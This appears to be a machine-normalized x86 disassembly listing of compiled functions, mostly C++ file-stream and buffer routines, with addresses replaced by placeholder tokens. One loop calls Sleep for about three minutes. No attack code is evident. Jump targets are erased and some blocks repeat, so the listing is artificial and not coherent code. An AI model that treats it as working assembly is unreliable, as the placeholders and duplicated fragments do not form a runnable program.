lea eax [ ebp - 0x2d ]
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x3c ] eax
jne r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x34 ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x5c ]
push eax
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov ecx [ ebp - 0x34 ]
sub ecx eax
push ecx
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10002143
cmp [ ebp - 0x18 ] edi
jb r-xdata
test edi edi
jg r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007e4e
push edi
mov ecx eax
call sub_10006a85
push eax
lea eax [ ebp - 0x2d ]
push edi
push eax
call sub_1002005a
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x34 ]
push [ esi + 0x4c ]
dec edi
movsx eax [ edi + eax ]
push eax
call sub_100227a0
pop ecx
pop ecx
movzx esi [ ebp - 0x2d ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax esi
jmp r-xdata
sub_1000e4f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push edi
lea edi [ esi + 0x40 ]
xor ebx ebx
cmp [ eax ] edi
jne r-xdata
cmp [ esi + 0x4c ] ebx
je r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_1000e98c
test al al
je r-xdata
cmp [ esi + 0x3c ] ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
dec [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x4c ]
call sub_100229a0
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_10022a25
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ esi + 0x20 ]
cmp [ eax ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x44 ]
mov [ eax ] ebx
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x41 ]
mov [ ecx ] eax
mov ecx esi
sub ecx eax
mov eax [ esi + 0x30 ]
add ecx 0x41
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_1000e5b1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov esi ecx
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x18 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ esp + 0x14 ] eax
cmp [ esi + 0x4c ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_1000e98c
test al al
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_10022a93
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp edi ebx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_10022a25
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x1
push edi
push [ esi + 0x4c ]
call sub_100229a0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov [ esi + 0x44 ] eax
mov eax [ esi + 0x20 ]
lea ecx [ esi + 0x40 ]
cmp [ eax ] ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x44 ]
mov [ eax ] ebx
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] ecx
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x41 ]
mov [ ecx ] eax
mov ecx esi
sub ecx eax
mov eax [ esi + 0x30 ]
add ecx 0x41
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
sub_1000e685
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
cmp [ esp + 0x8 ] ecx
jne r-xdata
push [ esp + 0xc ]
push ecx
push [ esp + 0x10 ]
push eax
call sub_10022ad8
add esp 0x10
test eax eax
jne r-xdata
cmp [ esp + 0xc ] ecx
jne r-xdata
push edi
mov edi [ esi + 0x4c ]
push 0x1
call sub_1000e948
mov eax esi
pop edi
jmp r-xdata
push 0x4
pop ecx
pop esi
retn 0x8
sub_1000e6cc
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push 0xffffffff
call [ eax + 0x4 ]
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x4c ]
call sub_10022d60
pop ecx
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
retn
sub_1000e6f7
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_1000ec6b
mov esi eax
mov eax [ esi ]
pop ecx
mov ecx esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax edi
mov [ edi + 0x3c ] esi
call sub_1000cc45
and [ edi + 0x3c ] 0x0
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_1000e727
push 0x4
mov eax sub_1004a2e9
call sub_10023e33
mov ebx ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea edi [ esi + 0x4 ]
push edi
add ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_1000cbd9
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_1000cb0a
mov eax edi
mov [ edi ] r--data
mov [ edi + 0x48 ] 0x0
mov [ edi + 0x41 ] 0x0
call sub_1000cc45
mov eax [ rw-data ]
and [ edi + 0x4c ] 0x0
and [ edi + 0x3c ] 0x0
mov [ edi + 0x44 ] eax
or ebx 0x2
push ebx
push [ ebp + 0xc ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_1000e885
test eax eax
jne r-xdata
mov eax esi
call sub_10023f0b
retn 0x8
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_10007d13
or ecx 0x4
sub_1000e7ec
push 0x4
mov eax sub_10049058
call sub_10023e33
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x50 ]
mov ecx esi
call sub_1000e061
mov eax [ esi - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x4 ] r--data
call sub_10023f0b
retn
sub_1000e885
push 0x0
mov eax sub_10048d5c
call sub_10023e33
mov esi ecx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
xor eax eax
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001c24f
add esp 0xc
test eax eax
je r-xdata
push 0x1
mov edi eax
call sub_1000e948
lea eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_1000eadf
and [ ebp - 0x4 ] 0x0
push eax
call sub_1000ec6b
mov edi eax
mov eax [ edi ]
pop ecx
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax esi
mov [ esi + 0x3c ] edi
call sub_1000cc45
and [ esi + 0x3c ] 0x0
jmp r-xdata
call sub_10023f0b
retn 0x8
lea ecx [ ebp + 0xc ]
call sub_10007b41
mov eax esi
jmp r-xdata
sub_1000e8ff
push ebx
push esi
mov esi eax
xor ebx ebx
push edi
mov edi esi
cmp [ esi + 0x4c ] ebx
je r-xdata
xor edi edi
call sub_1000e98c
test al al
jne r-xdata
push [ esi + 0x4c ]
call sub_10022e33
pop ecx
test eax eax
je r-xdata
xor edi edi
mov eax esi
mov [ esi + 0x48 ] bl
mov [ esi + 0x41 ] bl
call sub_1000cc45
mov eax [ rw-data ]
mov [ esi + 0x44 ] eax
mov eax edi
pop edi
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] ebx
pop esi
pop ebx
retn
sub_1000e948
cmp [ esp + 0x4 ] 0x1
mov [ esi + 0x41 ] 0x0
sete al
mov [ esi + 0x48 ] al
mov eax esi
call sub_1000cc45
test edi edi
je r-xdata
mov eax [ rw-data ]
and [ esi + 0x3c ] 0x0
mov [ esi + 0x4c ] edi
mov [ esi + 0x44 ] eax
retn 0x4
lea eax [ edi + 0x8 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
lea eax [ edi + 0x4 ]
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
sub_1000e98c
push 0x4c
mov eax sub_10048d2f
call sub_10023e9c
xor edi edi
cmp [ esi + 0x3c ] edi
je r-xdata
mov al 0x1
cmp [ esi + 0x41 ] 0x0
je r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0x4 ]
cmp eax 0xffffffff
jne r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_10005ad1
mov [ ebp - 0x4 ] edi
xor al al
jmp r-xdata
mov [ esi + 0x41 ] 0x0
dec eax
je r-xdata
call sub_10023f1f
retn
cmp [ esi + 0x41 ] 0x0
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
push [ esi + 0x4c ]
push edi
push 0x1
push eax
call sub_1002262d
add esp 0x10
cmp edi eax
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov edi [ ebp - 0x34 ]
sub edi eax
je r-xdata
dec eax
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
test edi edi
jne r-xdata
xor bl bl
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100023ce
mov al bl
jmp r-xdata
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov edi [ ebp - 0x1c ]
mov ebx eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
mov ecx [ esi + 0x3c ]
mov edx [ ecx ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x34 ]
push eax
add edi ebx
push edi
push [ ebp - 0x38 ]
lea eax [ esi + 0x44 ]
push eax
call [ edx + 0x18 ]
sub eax 0x0
je r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_10005af7
jmp r-xdata
sub_1000eaf2
push 0x1c
mov eax sub_1004a719
call sub_10023e66
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x18 ]
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x20 ] ecx
jle r-xdata
mov [ ebp - 0x18 ] ebx
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
sub eax ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
xor edi edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov edi esi
call sub_1000ee8f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + esi + 0x28 ]
mov eax [ ebp + 0xc ]
call sub_1000ee03
movzx eax [ eax ]
push eax
mov ecx ebx
call sub_1000ee23
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov cl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x1c ] cl
push [ ebp - 0x1c ]
mov ecx eax
call sub_1000ee23
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_10007c4c
mov eax esi
call sub_10023f0b
retn
push ebx
push [ ebp - 0x14 ]
call sub_10007e2d
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov [ eax + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
inc edi
xor ebx ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
xor ebx ebx
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov cl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov [ ebp + 0xc ] cl
push [ ebp + 0xc ]
mov ecx eax
call sub_1000ee23
cmp eax 0xffffffff
jne r-xdata
cmp edi [ ebp - 0x20 ]
jae r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_1000ec39
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000ec6b
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000ed08
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1000ed08
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x2
pop eax
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10020186
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] ebx
call sub_1000768f
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ edi ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1000eda6
push 0x4
mov eax sub_10048908
call sub_10023e66
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10020186
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_10023f0b
retn 0x4
sub_1000ee03
push esi
mov esi eax
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_1002059f
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop esi
retn
sub_1000ee23
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
movzx edx [ esp + 0x4 ]
mov eax [ ecx ]
push edx
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov al [ esp + 0x4 ]
mov [ ecx ] al
movzx eax al
jmp r-xdata
test eax eax
jle r-xdata
retn 0x4
sub_1000ee8f
push 0x0
mov eax sub_1004a7fd
call sub_10023e33
mov ebx [ ebp + 0x8 ]
mov [ ebx ] edi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ eax + 0x4 ]
call sub_1001b0a5
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0x8 ] 0x0
sete al
mov [ ebx + 0x4 ] al
mov eax ebx
call sub_10023f0b
retn 0x4
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov esi eax
call sub_1000d39d
sub_1000ef19
push 0x4
mov eax sub_10049eb1
call sub_10023e33
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x54 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10001daa
push [ ebp + 0xc ]
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_100020c6
push r--data
lea ecx [ esi + 0x3c ]
mov [ ebp - 0x4 ] 0x2
call sub_100012f3
push r--data
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] 0x3
call sub_100012f3
add edi 0x70
push edi
lea eax [ esi + 0x74 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10001315
mov eax esi
call sub_10023f0b
retn 0x8
sub_1000efa8
push esi
push edi
mov edi ecx
lea esi [ edi + 0x74 ]
mov [ edi ] r--data
call sub_10001508
push [ esi ]
call sub_1002004f
pop ecx
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ edi + 0x58 ]
call sub_10002597
push 0x0
push esi
lea ecx [ edi + 0x3c ]
call sub_10002597
push 0x0
push esi
lea ecx [ edi + 0x20 ]
call sub_10002597
push 0x0
push esi
lea ecx [ edi + 0x4 ]
call sub_100023ce
mov [ edi ] r--data
pop edi
pop esi
retn
sub_1000effa
push ebp
sub esp 0xc8
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xc8 ] eax
push 0x50
mov eax sub_1004b168
call sub_10023e66
mov eax [ ebp + 0xd4 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xd8 ]
mov edi ecx
mov [ ebp - 0x1c ] eax
lea eax [ edi + 0x74 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x5c ] r--data
call sub_10001315
xor esi esi
push esi
push 0x1
mov [ ebp - 0x4 ] esi
call sub_10001b38
pop ecx
pop ecx
cmp eax esi
je r-xdata
xor eax eax
lea ecx [ ebp - 0x40 ]
mov [ eax ] ecx
jmp r-xdata
lea ecx [ ebp - 0x5c ]
call sub_1000f207
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xc8 ]
xor ecx ebp
call sub_10020040
add ebp 0xcc
leave
retn 0x8
cmp [ ebp - 0x14 ] esi
je r-xdata
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10022104
push eax
call sub_10022eaf
pop ecx
pop ecx
lea eax [ ebp - 0x5c ]
call sub_1000f2cb
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x14 ] esi
lea ecx [ ebp + 0x90 ]
lea edx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x3
call sub_1000f22a
lea eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] 0x5
push eax
lea ecx [ ebp + 0x4 ]
mov [ ebp ] r--data
call sub_10001daa
lea eax [ edi + 0x20 ]
push eax
lea ecx [ ebp + 0x20 ]
mov [ ebp - 0x4 ] 0x6
call sub_100020c6
lea eax [ edi + 0x3c ]
push eax
lea ecx [ ebp + 0x3c ]
mov [ ebp - 0x4 ] 0x7
call sub_100020c6
lea eax [ edi + 0x58 ]
push eax
lea ecx [ ebp + 0x58 ]
mov [ ebp - 0x4 ] 0x8
call sub_100020c6
lea eax [ ebp + 0x90 ]
push eax
lea ecx [ ebp + 0x74 ]
mov [ ebp - 0x4 ] 0x9
call sub_100020c6
push esi
lea ecx [ ebp + 0xac ]
mov [ ebp + 0xc4 ] 0xf
call sub_10002493
lea eax [ ebp + 0xac ]
push eax
push [ ebp - 0x20 ]
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xb
call sub_100107cf
cmp [ ebp + 0xc0 ] esi
jbe r-xdata
push 0x2bf20
call [ Sleep@IAT ]
push esi
push 0x1
lea ecx [ ebp + 0xac ]
call sub_100023ce
lea ecx [ ebp ]
call sub_10010783
push esi
push 0x1
lea ecx [ ebp + 0x90 ]
call sub_10002597
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x1c ]
push 0xffffffff
push esi
lea eax [ ebp + 0xac ]
push eax
call sub_100021b2
push esi
push 0x1
lea ecx [ ebp + 0xac ]
call sub_100023ce
lea ecx [ ebp ]
call sub_10010783
push esi
push 0x1
lea ecx [ ebp + 0x90 ]
call sub_10002597
inc [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x4c ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp - 0x14 ] eax
jae r-xdata
sub_1000f1fa
mov edi [ ebp - 0x18 ]
xor esi esi
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x4c ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp - 0x14 ] eax
jae r-xdata
lea ecx [ ebp - 0x5c ]
call sub_1000f207
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xc8 ]
xor ecx ebp
call sub_10020040
add ebp 0xcc
leave
retn 0x8
cmp [ ebp - 0x14 ] esi
je r-xdata
lea ecx [ ebp + 0x90 ]
lea edx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x3
call sub_1000f22a
lea eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] 0x5
push eax
lea ecx [ ebp + 0x4 ]
mov [ ebp ] r--data
call sub_10001daa
lea eax [ edi + 0x20 ]
push eax
lea ecx [ ebp + 0x20 ]
mov [ ebp - 0x4 ] 0x6
call sub_100020c6
lea eax [ edi + 0x3c ]
push eax
lea ecx [ ebp + 0x3c ]
mov [ ebp - 0x4 ] 0x7
call sub_100020c6
lea eax [ edi + 0x58 ]
push eax
lea ecx [ ebp + 0x58 ]
mov [ ebp - 0x4 ] 0x8
call sub_100020c6
lea eax [ ebp + 0x90 ]
push eax
lea ecx [ ebp + 0x74 ]
mov [ ebp - 0x4 ] 0x9
call sub_100020c6
push esi
lea ecx [ ebp + 0xac ]
mov [ ebp + 0xc4 ] 0xf
call sub_10002493
lea eax [ ebp + 0xac ]
push eax
push [ ebp - 0x20 ]
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xb
call sub_100107cf
cmp [ ebp + 0xc0 ] esi
jbe r-xdata
push 0x2bf20
call [ Sleep@IAT ]
push esi
push 0x1
lea ecx [ ebp + 0xac ]
call sub_100023ce
lea ecx [ ebp ]
call sub_10010783
push esi
push 0x1
lea ecx [ ebp + 0x90 ]
call sub_10002597
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x1c ]
push 0xffffffff
push esi
lea eax [ ebp + 0xac ]
push eax
call sub_100021b2
push esi
push 0x1
lea ecx [ ebp + 0xac ]
call sub_100023ce
lea ecx [ ebp ]
call sub_10010783
push esi
push 0x1
lea ecx [ ebp + 0x90 ]
call sub_10002597
inc [ ebp - 0x14 ]
jmp r-xdata
sub_1000f22a
push 0x18
mov eax sub_10049e62
call sub_10023e33
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi edx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ecx
cmp [ esi + 0x38 ] eax
jne r-xdata
mov edi [ esi + 0x38 ]
call sub_10022ec1
xor edx edx
div edi
mov ebx [ esi + 0x34 ]
add esi 0x1c
lea edi [ ebp - 0x14 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] edx
call sub_1000f5c0
mov ebx [ ebp - 0x24 ]
mov esi edi
call sub_1000f5e6
mov eax edi
call sub_1000f434
mov ecx [ ebp - 0x18 ]
push eax
call sub_100020c6
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] 0x1
push eax
push [ ebp - 0x20 ]
call sub_1000f3ef
mov eax [ ebp - 0x18 ]
call sub_10023f0b
retn
mov eax esi
call sub_1000f2cb
sub_1000f2cb
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push ebx
push esi
mov esi eax
lea ecx [ esi + 0x4 ]
mov eax [ ecx + 0x10 ]
sub eax [ ecx + 0xc ]
push edi
push 0x1c
mov [ esp + 0x14 ] ecx
pop ecx
cdq
idiv ecx
sub esp 0x1c
mov ecx esp
mov [ esp + 0x34 ] esp
mov edi eax
call sub_10001b23
add esi 0x1c
push edi
mov ecx esi
call sub_1000f632
mov ebx [ esi + 0x18 ]
lea edi [ esp + 0x20 ]
call sub_1000f5c0
mov edi [ esp + 0x10 ]
mov ebx [ edi + 0x10 ]
lea esi [ esp + 0x28 ]
call sub_10001909
mov ebx [ edi + 0xc ]
lea esi [ esp + 0x10 ]
call sub_10001909
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov esi [ esp + 0x20 ]
lea edi [ esp + 0x30 ]
mov [ esp + 0x18 ] esi
mov ebx eax
lea eax [ esp + 0x18 ]
call sub_1000f726
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
cmp esi [ esp + 0x2c ]
jne r-xdata
mov eax [ esi ]
mov esi [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
jmp r-xdata
lea eax [ esp + 0x18 ]
call sub_1000f434
push 0xffffffff
push 0x0
push esi
mov ecx eax
call sub_10002033
inc [ esp + 0x1c ]
add esi 0x1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000f3a3
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
call sub_1000f6f6
push edi
mov edi [ esi + 0x14 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edi ebx
ja r-xdata
dec edi
lea eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
pop edi
cmp eax ebx
je r-xdata
